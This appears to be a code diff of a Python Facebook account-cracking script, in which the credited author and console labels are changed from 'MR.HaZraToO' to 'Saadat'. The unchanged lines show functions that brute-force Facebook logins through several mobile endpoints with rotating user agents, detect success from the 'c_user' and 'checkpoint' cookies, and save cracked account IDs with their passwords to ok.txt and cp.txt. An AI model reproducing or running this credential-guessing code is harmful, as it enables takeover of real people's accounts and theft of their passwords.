@@ -185,18 +185,17 @@ syed =[
 'Mozilla/5.0 (Linux; Android 10; CPH2067 Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36',]
 logo = """
           \033[1;97m
-$$\   $$\  $$$$$$\  $$$$$$$$\ $$$$$$$\   $$$$$$\ $$$$$$$$\ 
-\033[1;37m$$ |  $$ |$$  __$$\ \____$$  |$$  __$$\ $$  __$$\\__$$  __|
-\033[1;32m$$ |  $$ |$$ /  $$ |    $$  / $$ |  $$ |$$ /  $$ |  $$ |   
-\033[1;32m$$$$$$$$ |$$$$$$$$ |   $$  /  $$$$$$$  |$$$$$$$$ |  $$ |   
-\033[1;32m$$  __$$ |$$  __$$ |  $$  /   $$  __$$< $$  __$$ |  $$ |   
-\033[1;39m$$ |  $$ |$$ |  $$ | $$  /    $$ |  $$ |$$ |  $$ |  $$ |   
-\033[1;39m$$ |  $$ |$$ |  $$ |$$$$$$$$\ $$ |  $$ |$$ |  $$ |  $$ |   
-\033[1;39m\__|  \__|\__|  \__|\________|\__|  \__|\__|  \__|  \__|   
+      \033[1;39m .########...######..##.....##
+      \033[1;32m .##.....##.##....##.##.....##
+      \033[1;39m .##.....##.##.......##.....##
+      \033[1;32m .########...######..#########
+      \033[1;39m .##...##.........##.##.....##
+      \033[1;32m .##....##..##....##.##.....##
+      \033[1;39m .##.....##..######..##.....## 
 [+]═══════════════════════════════════════════
-\033[1;37m[+] \033[1;37mCREATED BY   :  \033[1;37mMR.HaZraToO
-\033[1;37m[+] \033[1;37mON FACEBOK   :  \033[1;37mMR.HaZraToO
-\033[1;37m[+] \033[1;37mON GITHUB    :  \033[1;37mHaZraToO-143
+\033[1;37m[+] \033[1;37mCREATED BY   :  \033[1;37mRaziqullah Saadat
+\033[1;37m[+] \033[1;37mON FACEBOK   :  \033[1;37mRaziqullah Saadat
+\033[1;37m[+] \033[1;37mON GITHUB    :  \033[1;37mSaid404
 \033[1;37m[+] \033[1;37mTOOL STATUS  :  \033[1;37mFREE
 \033[1;37m[+] \033[1;37mTOOL VIRSION :  \033[1;31m4.0.8
 \x1b[1;97m[+]═══════════════════════════════════════════"""
@@ -333,7 +332,7 @@ def mcrack(uid,pwx,tl):
 	try:
 		for ps in pwx:
 			session = requests.Session()
-			sys.stdout.write(f'\r [\033[1;97mMR.HaZraToO\033[1;97m] [%s] OK:-%s \r'%(loop,len(oks))),
+			sys.stdout.write(f'\r [\033[1;97mSaadat\033[1;97m] [%s] OK:-%s \r'%(loop,len(oks))),
 			sys.stdout.flush()
 			ua = random.choice(ugen)
 			free_fb = session.get('https://m.facebook.com').text
@@ -369,7 +368,7 @@ def mcrack(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\033[1;92m[HaZraToO-OK] '+cid+' | '+ps+'\033[1;32m')
+				print('\033[1;92m[Saadat-OK] '+cid+' | '+ps+'\033[1;32m')
 				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
 				oks.append(cid) 
 				break
@@ -480,7 +479,7 @@ def fcrack(uid,pwx,tl):
 	try:
 		for ps in pwx:
 			session = requests.Session()
-			sys.stdout.write(f'\r [\033[1;97mMR.HaZraToO\033[1;97m] [%s] OK:-%s \r'%(loop,len(oks))),
+			sys.stdout.write(f'\r [\033[1;97mStart\033[1;97m] [%s] OK:-%s \r'%(loop,len(oks))),
 			sys.stdout.flush()
 			ua = random.choice(ugen)
 			free_fb = session.get('https://free.facebook.com').text
@@ -509,14 +508,14 @@ def fcrack(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\033[1;92m[HaZraToO-OK] '+cid+' | '+ps+'\033[1;32m')
+				print('\033[1;92m[Saadat-OK] '+cid+' | '+ps+'\033[1;32m')
 				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
-				print('\33[1;91m[HaZraToO-CP] '+cid+' | '+ps+'\33[0;97m')
+				print('\33[1;91m[Saadat-CP] '+cid+' | '+ps+'\33[0;97m')
 				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
@@ -563,7 +562,7 @@ def mbcrack(uid,pwx,tl):
 	try:
 		for ps in pwx:
 			session = requests.Session()
-			sys.stdout.write(f'\r [\033[1;92mMR.HaZraToO\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] \r'%(loop,tl,len(oks))),
+			sys.stdout.write(f'\r [\033[1;92mStart\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] \r'%(loop,tl,len(oks))),
 			sys.stdout.flush()
 			ua = random.choice(syed)
 			free_fb = session.get('https://mbasic.facebook.com').text
@@ -597,7 +596,7 @@ def mbcrack(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[7:22]
-				print('\033[1;92m[HaZraToO-OK] '+cid+' | '+ps+'\033[1;32m')
+				print('\033[1;92m[Saadat-OK] '+cid+' | '+ps+'\033[1;32m')
 				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
 				break
